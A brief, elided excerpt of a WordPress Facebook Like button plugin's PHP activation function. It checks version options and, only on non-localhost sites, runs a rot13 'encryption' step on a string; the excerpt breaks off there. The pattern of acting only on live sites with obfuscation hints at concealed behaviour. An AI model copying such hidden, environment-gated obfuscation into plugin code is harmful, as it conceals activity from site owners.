...
function gxtb_fb_lB_activate(){
	...
	if ( get_option('gxtb_fb_lB') || (isset($this->GBLikeButton['PluginInfo']['lVersion']) && (version_compare($this->GBLikeButton['PluginInfo']['lVersion'], '4.4', '<') || $this->GBLikeButton['PluginInfo']['lVersion'] == "" )) ) {
	...
	if ( !strstr(get_bloginfo('url'), "localhost") ) {
		$pluginencrypted = $this->rot13encrypt("FBLike");
